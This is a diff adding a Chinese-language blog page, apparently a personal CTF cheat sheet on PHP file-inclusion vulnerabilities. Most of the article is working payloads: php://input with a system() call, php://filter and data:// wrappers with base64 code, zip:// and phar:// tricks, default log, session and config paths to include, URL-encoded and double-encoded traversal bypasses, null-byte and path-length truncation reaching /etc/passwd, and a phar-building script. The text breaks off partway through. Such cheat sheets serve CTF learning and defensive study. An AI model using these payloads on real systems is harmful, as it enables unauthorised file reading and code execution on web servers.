@@ -1,0 +1,1447 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+  
+  
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    
+    
+      
+      
+      
+      
+        
+        
+      
+      
+    
+    
+    
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.json'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="前言 本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。   LFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI RFI：Remote File Inclusion，远程文件包含漏洞，要求allow_url_fopen=On(默认为On) ，规定是否允许从远程服务器或者网站检索数据；allow_url_include=On(php">
+<meta name="keywords" content="CTF,总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Web【文件包含】漏洞做题姿势积累">
+<meta property="og:url" content="https://fanygit.github.io/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/index.html">
+<meta property="og:site_name" content="Fan的小酒馆">
+<meta property="og:description" content="前言 本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。   LFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI RFI：Remote File Inclusion，远程文件包含漏洞，要求allow_url_fopen=On(默认为On) ，规定是否允许从远程服务器或者网站检索数据；allow_url_include=On(php">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-12-13T14:37:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF-Web【文件包含】漏洞做题姿势积累">
+<meta name="twitter:description" content="前言 本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。   LFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI RFI：Remote File Inclusion，远程文件包含漏洞，要求allow_url_fopen=On(默认为On) ，规定是否允许从远程服务器或者网站检索数据；allow_url_include=On(php">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://fanygit.github.io/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>CTF-Web【文件包含】漏洞做题姿势积累 | Fan的小酒馆</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Fan的小酒馆</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fanygit.github.io/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Fany">
+      <meta itemprop="description" content="路虽远，行则必达。">
+      <meta itemprop="image" content="/images/tx5.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fan的小酒馆">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF-Web【文件包含】漏洞做题姿势积累
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-10-23 16:44:00" itemprop="dateCreated datePublished" datetime="2021-10-23T16:44:00+08:00">2021-10-23</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-12-13 22:37:46" itemprop="dateModified" datetime="2021-12-13T22:37:46+08:00">2021-12-13</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/CTF做题姿势总结/" itemprop="url" rel="index"><span itemprop="name">CTF做题姿势总结</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+            
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="fa fa-comment-o"></i>
+    </span>
+    
+      <span class="post-meta-item-text">评论数：</span>
+    
+  
+    <a href="/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/23/CTF-Web【文件包含】漏洞做题姿势积累/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p>本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。</p>
+</blockquote>
+<ol>
+<li>LFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI</li>
+<li>RFI：Remote File Inclusion，远程文件包含漏洞，要求<strong>allow_url_fopen=On</strong>(默认为On) ，规定是否允许从远程服务器或者网站检索数据；<strong>allow_url_include=On</strong>(php5.2之后默认为Off) ，规定是否允许include/require远程文件</li>
+</ol>
+<h3 id="php常见文件包含函数"><a href="#php常见文件包含函数" class="headerlink" title="php常见文件包含函数"></a>php常见文件包含函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include()：遇到错误生成警告，继续执行脚本</span><br><span class="line">require()：遇到错误生成致命错误，脚本继续</span><br><span class="line">include_once()：如果文件已包含，则不再进行包含，一定程度避免错误</span><br><span class="line">require()_once()：如果文件已包含，则不再进行包含，一定程度避免错误</span><br><span class="line">fopen()，file_get_contents()等：文件读取函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h3><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input（allow-url-include-On）"><a href="#php-input（allow-url-include-On）" class="headerlink" title="php://input（allow_url_include=On）"></a>php://input（allow_url_include=On）</h5><blockquote>
+<p>遇到file_get_contents()要想到用php://input绕过</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造?file=php://input</span><br><span class="line">post data中输入：&lt;?php system(&apos;dir&apos;);?&gt;    //代码表示显示所有文件目录</span><br><span class="line">根据显示的文件目录直接进行访问（某txt或php文件），得到flag</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><blockquote>
+<p>可以使用的函数：readfile()、file()、file_get_contents()、include()</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><blockquote>
+<p>要求allow_url_fopen=On，allow_url_include=On</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php phpinfo()?&gt;    //执行phpinfo()</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=    //将命令进行base64加密，编码为“&lt;?php phpinfo()?&gt; ”的base64编码</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo()?&gt;    //去掉双斜杠</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><blockquote>
+<p>zip:// 可以访问压缩包里面的文件。<br>zip://中只能传入<strong>绝对路径</strong>；要用#分隔压缩包和压缩包里的内容，且#要用url编码<strong>%23</strong>代替</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://D:\file.zip%23flag.txt</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>D:\file.zip表示压缩包的绝对路径</li>
+<li>后跟%23分割压缩包和压缩包中要访问的文件名</li>
+</ol>
+<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><blockquote>
+<p>类似zip://，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://D:\file.zip\flag.txt    //绝对路径</span><br><span class="line">?file=phar://file.zip\flag.txt    //相对路径</span><br></pre></td></tr></table></figure>
+
+<h4 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h4><h5 id="日志和配置文件默认存放路径"><a href="#日志和配置文件默认存放路径" class="headerlink" title="日志和配置文件默认存放路径"></a>日志和配置文件默认存放路径</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache+Linux日志默认路径 </span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache+win2003日志默认路径 </span><br><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0+win2003默认日志文件 </span><br><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS7.0+win2003 默认日志文件  %SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx 日志文件 </span><br><span class="line">用户安装目录logs目录下（/usr/local/nginx/logs） </span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache+linux 默认配置文件 </span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">index.php?page=/etc/init.d/httpd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IIS7.0+WIN 配置文件 C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure>
+
+<h5 id="session常见存储路径"><a href="#session常见存储路径" class="headerlink" title="session常见存储路径"></a>session常见存储路径</h5><blockquote>
+<p>php的session文件的保存路径可以在phpinfo的<strong>session.save_path</strong>看到，<br>session文件格式： sess_[phpsessid] ，phpsessid在发送的请求的 cookie 字段中可以看到</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<h4 id="包含系统文件"><a href="#包含系统文件" class="headerlink" title="包含系统文件"></a>包含系统文件</h4><p>包含 /pros/self/environ</p>
+<p>条件</p>
+<ul>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ul>
+<blockquote>
+<p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
+</blockquote>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h5 id="过滤read、resource"><a href="#过滤read、resource" class="headerlink" title="过滤read、resource"></a>过滤read、resource</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read）</span><br><span class="line">绕过方式：</span><br><span class="line">?f=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php（正则 /resource=*.jpg/i）</span><br></pre></td></tr></table></figure>
+
+<h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ../"></a>过滤 ../</h5><p><strong>利用url编码</strong></p>
+<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+<p><strong>二次编码</strong></p>
+<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+<p><strong>容器/服务器的编码方式</strong></p>
+<ul>
+<li>../<ul>
+<li>..%c0%af</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+<h3 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a><strong>截断包含</strong></h3><p>要求</p>
+<ul>
+<li>php版本小于5.3.4</li>
+<li>magic_quotes_gpc=off</li>
+</ul>
+<p>原理</p>
+<ul>
+<li>Windows下目录最大长度为256字节，超出的部分会被丢弃</li>
+<li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    include(“includes/” . $_GET[&apos;file&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span>(“includes/” . $_GET[<span class="string">'file'</span>] . “.htm”); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>url绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=http://localhost:8081/phpinfo.php?</span><br><span class="line">拼接后：?file=http://localhost:8081/phpinfo.php?.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=http://localhost:8081/phpinfo.php%23</span><br><span class="line">拼接后：?file=http://localhost:8081/phpinfo.php#.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>%00截断包含</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=../hanguo/test.php%00</span><br></pre></td></tr></table></figure>
+
+<p><strong>列目录</strong></p>
+<blockquote>
+<p>条件：magic_quotes_gpc=off</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/www/accounts/%00</span><br></pre></td></tr></table></figure>
+
+<p><strong>路径遍历</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/lib/locate.db</span><br></pre></td></tr></table></figure>
+
+<p><strong>路径截断</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
+
+<p><strong>点号截断（windows下）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd……………. …</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用phar://协议绕过waf检测</strong></p>
+<p>版本要求：php 5.3.0 起<br><strong>利用php伪协议读取php文件内容</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data要求：</span><br><span class="line">php5.2以后</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php phpinfo();?&gt;%00data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<p>php://filte</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要求：</span><br><span class="line">需要开启allow_url_include</span><br><span class="line">poc</span><br><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure>
+
+<p>远程文件包含要求：allow_url_fopen：on</p>
+<p>长度截断利用条件： php版本 &lt; php 5.2.8</p>
+<h4 id="使用截断包含-绕过拼接后缀名"><a href="#使用截断包含-绕过拼接后缀名" class="headerlink" title="使用截断包含 绕过拼接后缀名"></a>使用截断包含 绕过拼接后缀名</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>%00</p>
+<h4 id="长目录名截断"><a href="#长目录名截断" class="headerlink" title="长目录名截断"></a>长目录名截断</h4><p>windows下 最大长度为256Linux下最大为4096子节，超出部分会被丢弃</p>
+<h4 id="phar-php-gt-5-3-0起"><a href="#phar-php-gt-5-3-0起" class="headerlink" title="phar://(php&gt;5.3.0起)"></a>phar://(php&gt;5.3.0起)</h4><p>phar://支持zip、phar格式的压缩（归档）文件，无视后缀（也就是说jpg后缀照样给你解开来），?file=phar://压缩包路径/压缩包内文件名，绝对路径和相对路径都行。</p>
+<p>利用方法：index.php?file=phar://test.zip/test.txtindex.php?file=phar://test.xxx/test.txt</p>
+<h4 id="制作phar文件（php5-3之后）"><a href="#制作phar文件（php5-3之后）" class="headerlink" title="制作phar文件（php5.3之后）"></a>制作phar文件（php5.3之后）</h4><blockquote>
+<p>设置php.ini中phar.readonly=off</p>
+</blockquote>
+<p>制作生成脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@unlink(&quot;phar.phar&quot;);</span><br><span class="line">	$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">	$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;); //添加要压缩的文件及内容</span><br><span class="line">	$phar-&gt;stopBuffering(); //签名自动计算</span><br><span class="line">?&gt;</span><br><span class="line">// 这个脚本需要使用php.exe 来生成</span><br></pre></td></tr></table></figure>
+
+<p>生成脚本2</p>
